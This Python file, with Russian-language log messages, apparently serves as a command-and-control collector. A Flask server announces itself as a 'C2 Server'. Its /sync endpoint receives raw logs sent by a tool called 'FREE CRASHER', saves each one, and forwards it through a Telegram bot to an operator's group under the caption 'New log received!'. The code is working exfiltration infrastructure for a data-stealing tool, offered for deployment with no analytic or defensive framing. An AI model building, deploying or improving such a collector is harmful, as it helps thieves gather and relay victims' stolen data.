import os
import telebot
from flask import Flask, request
from threading import Thread
import time

TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID", "")
if ADMIN_ID and not ADMIN_ID.startswith('-'):
    MY_ID = int(f"-100{ADMIN_ID}")
else:
    MY_ID = int(ADMIN_ID) if ADMIN_ID else 0

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return "C2 Server is Online", 200

@app.route('/sync', methods=['POST'])
def sync():
    print(f"\n[+] [{time.strftime('%H:%M:%S')}] ПОЛУЧЕН ЗАПРОС ОТ FREE CRASHER")
    try:
        raw_data = request.data.decode('utf-8', errors='ignore')
        
        if not raw_data:
            print("[-] Пустой запрос")
            return "Empty data", 400

        print(f"[*] Размер данных: {len(raw_data)} байт")
        file_path = f"log_{int(time.time())}.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(raw_data)


        caption = f" **Новый лог получен!**\nВремя: `{time.strftime('%Y-%m-%d %H:%M:%S')}`\nID Группы: `{MY_ID}`"
        
        with open(file_path, "rb") as doc:
            bot.send_document(MY_ID, doc, caption=caption, parse_mode='Markdown')
        
        print(f"[!] Лог успешно отправлен в ID: {MY_ID}")
        os.remove(file_path)
        return "OK", 200

    except Exception as e:
        print(f"[!!!] ОШИБКА ОБРАБОТКИ: {e}")
        return str(e), 500

def run_flask():
    # Bothost сам скажет, какой порт использовать
    port = int(os.environ.get("PORT", 5000))
    print(f"[*] Запуск Flask на порту {port}...")
    app.run(host='0.0.0.0', port=port)

def run_bot():
    print("[*] Запуск Telegram Polling...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"[!] Ошибка бота: {e}")
            time.sleep(5)

if __name__ == "__main__":

    t1 = Thread(target=run_flask)
    t2 = Thread(target=run_bot)
    t1.start()
    t2.start()
